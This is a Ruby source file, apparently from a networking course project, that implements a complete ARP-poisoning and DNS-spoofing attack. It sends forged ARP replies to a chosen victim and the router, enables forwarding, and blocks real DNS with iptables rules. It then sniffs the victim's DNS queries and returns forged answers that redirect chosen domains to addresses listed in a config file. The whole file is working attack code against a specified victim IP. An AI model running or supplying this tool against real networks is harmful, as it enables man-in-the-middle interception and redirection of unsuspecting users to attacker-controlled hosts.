#!/usr/bin/ruby
############################################################################################################
##	SOURCE FILE:		dnsspoof.rb - a dns spoofer in ruby
##
##	PROGRAM:		    dnsspoof
##
##	FUNCTIONS:		    runspoof
##                    check_spoof
##                    sendResponse
##                    get_info
##                    sniff
##
##	LAST MODIFIED:		November 2, 2014
##
##	DESIGNERS:	        Zach Smoroden & Slade Solobay
##                      Some code taken from Aman Abdulla's example
##
##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
##
##	NOTES:
##	        This program will arp poison the victim of your choosing and then spoof dns responses as
##  	      per the configuration file.
##
##  OUTPUT: nil
##
##	USAGE: ruby dns_spoof.rb -v <victim's IP> -r [router IP] -i [interface]
##
##############################################################################################################

require 'rubygems'
require 'packetfu'
require 'thread'
require 'macaddr'
require 'optparse'
require 'resolv'
require 'pp'
require_relative 'utils.rb'
include PacketFu

# Set up the rules for spoofing
$spoof_hash = Hash.new
config = File.open(CONFIG_FILE)
if(config.nil?)
  #config_error()
  exit()
end
config.each_line do |line|
  if(!line.nil? && line != "\n")
    domain, ip = line.split(' ')
    $spoof_hash[".*#{domain}"] = ip
  end
end

# Parse command line arguments
OptionParser.new do |opts|
  opts.on("-h", "--help", "usage and program help") do
    usage()
    exit(1)
  end
  opts.on("-v n", "--victim", "victim's IP address") do |vctm|
    $target_ip = vctm
  end
  opts.on("-r n", "--router", "router IP address") do |router|
    $router_ip = router
  end
  opts.on("-i n", "--interface", "network interface") do |interface|
    $iface = interface
  end
end.parse!

# Did they supply a victim and an address to spoof to?
if $target_ip.nil?
  abort("You must specify the victim's IP address and an IP address to spoof!")
end
# Get the mac addresses for all the necessary machines.
sender_mac = Mac.addr

`ping -c 1 #{$target_ip}`
target_mac = `arp | grep #{$target_ip} | awk '{ print $3} '`
router_mac = `arp | grep #{$router_ip} | awk '{ print $3} '`

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread.

# Construct the target's packet
arp_packet_target = ARPPacket.new()
arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
arp_packet_target.eth_daddr = target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
arp_packet_target.arp_saddr_ip = $router_ip        # router's IP
arp_packet_target.arp_daddr_ip = $target_ip         # target's IP
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply

# Construct the router's packet
arp_packet_router = ARPPacket.new()
arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
arp_packet_router.eth_daddr = router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
arp_packet_router.arp_saddr_ip = $target_ip         # target's IP
arp_packet_router.arp_daddr_ip = $router_ip        # router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`
######################################################################
##	FUNCTION:	    runspoof
##
##	INTERFACE:	    runspoof(arp_packet_target,arp_packet_router)
##
##				    arp_packet_target:   The crafted ARP packet to be sent to the victim
##
##            arp_packet_router:    The crafted ARP packet to be sent to the router
##
##
##	RETURNS:        Nothing
##
##	LAST MODIFIED:  Nov 1, 2014
##
##	DESIGNERS:	    Aman Abdulla
##
##	PROGRAMMERS:	Aman Abdulla
##
##	NOTES:
##	        This is used as a thread function. It will send the packets every second.
##
##
######################################################################
def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "Spoofing...."
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w($iface)
    arp_packet_router.to_w($iface)
  end
end
######################################################################
##	FUNCTION:	    check_spoof
##
##	INTERFACE:	    check_spoof(domainName)
##
##				    domainName:   The domain name to test against the spoof list
##
##
##
##	RETURNS:        the spoofed ip address or nil
##
##	LAST MODIFIED:  Nov 1, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Makes the configure file actualy work.
##
##
######################################################################
def check_spoof(domainName)
  $spoof_hash.each_key do |k|
    if domainName =~ /#{k}/
      puts "Spoofing: " +  Resolv.getaddress( $spoof_hash[k])
      return Resolv.getaddress $spoof_hash[k]
    end
  end
  puts "Getting: " + domainName

  x = Resolv.getaddress domainName

puts x
  return x
rescue Resolv::ResolvError => e
  p e.message
  p e.backtrace


end
######################################################################
##	FUNCTION:	    sendResponse
##
##	INTERFACE:	    sendResponse(packet, domainName, spoof_ip)
##
##            packet:       The full DNS packet
##				    domainName:   The domain name to test against the spoof list
##            spoof_ip:     The ip to spoof
##
##
##	RETURNS:        nothing
##
##	LAST MODIFIED:  Nov 1, 2014
##
##	DESIGNERS:	    Modified from Luke Queenan | crushbeercrushcode.org
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Crafts and sends the DNS response
##
##
######################################################################
def sendResponse(packet, domainName, spoof_ip)

  # Convert the IP address
  myIP = spoof_ip.split(".");
  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')

  # Create the UDP packet
  response = UDPPacket.new
  response.udp_src = packet.udp_dst
  response.udp_dst = packet.udp_src
  response.ip_saddr = packet.ip_daddr
  response.ip_daddr = packet.ip_saddr
  response.eth_daddr = packet.eth_saddr
  response.eth_saddr = packet.eth_daddr

  # Transaction ID
  response.payload = packet.payload[0,2]
  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

  # Domain name
  domainName.split(".").each do |section|
    response.payload += section.length.chr
    response.payload += section
  end

  # Set more default values...........
  response.payload += "\x00\x00\x01" + "\x00\x01\xc0\x0c\x00"
  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00\x04"

  # IP
  response.payload += myIP2

  # Calculate the packet
  response.recalc

  # Send the packet out
  response.to_w($iface)

end

def getDomainName(payload)
  domainName = ""
  while true
    len = payload[0].to_i
    if len != 0
      domainName += payload[1,len] + "."
      payload = payload[len+1..-1]
    else
      return domainName = domainName[0,domainName.length-1]
    end
  end
end
######################################################################
##	FUNCTION:	    get_info
##
##	INTERFACE:	    get_info(packet)
##
##            packet:       The full DNS packet
##
##
##
##	RETURNS:        the domain name
##
##	LAST MODIFIED:  Nov 1, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Gets the domain name from the packet.
##
##
######################################################################
def get_info(packet)
  # Get the length of the first domain level (in hex)
  len = "0x"+packet.payload[11].unpack('h*')[0].chr+packet.payload[12].unpack('h*')[0].chr

  # Start from the first letter
  i = 13;

  # Calculate the last value for the level
  last = i + len.hex

  # Initialize the domain string
  domain = String.new

  # Run in loop to handle infinite amount of levels
  x = true
  while x

    # Add the letters to the domain
    while i < last
      if packet.payload[i] != nil
        domain += packet.payload[i]
      end
      i += 1
    end

    # Get the new length for the next level(in hex)
    if packet.payload[i] != nil
      len = "0x"+packet.payload[i].unpack('h*')[0].chr
      # Increase counter to skip the length
      i += 1

      # Stop when we get a length of 0
      # otherwise add a '.' to the domain and calculate the new length
      if len == '0x0'
        x = false
      else
        domain += '.'
        last = i + len.hex
      end
    else
      x = false
    end
  end

  return domain
end

######################################################################
##	FUNCTION:	    sniff
##
##	INTERFACE:	    sniff(iface)
##
##            iface:        The network interface to capture packets

##
##
##	RETURNS:        nothing
##
##	LAST MODIFIED:  Nov 1, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Sniffs network traffic, finds DNS packets and then deals with them
##          appropriately.
##
##
######################################################################
def sniff(iface)
  puts 'Sniffing...'
  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53 and src host ' + $target_ip, :save => true)
  cap.stream.each do |p|
    packet = Packet.parse p

    $dnsQuery = packet.payload[2].unpack('h*')[0].chr+packet.payload[3].unpack('h*')[0].chr

    if $dnsQuery == '10'
      domain = get_info(packet)
      #domain = getDomainName(packet.payload[12..-1])
      if domain.nil?
        next
      end
      spoof_ip = check_spoof(domain)
      pp "SPOOFIP: " + spoof_ip.to_s
      if !spoof_ip.nil?
        sendResponse(packet, domain, spoof_ip)
      end
    end
  end
end

begin

  `iptables -A FORWARD -p UDP --dport 53 -j DROP`
  `iptables -A FORWARD -p TCP --dport 53 -j DROP`

  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}

  puts "Starting the sniffing..."

  sniff($iface)
  spoof_thread.join

rescue Interrupt
  puts "\nDNS spoof stopped by interrupt signal."
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0

end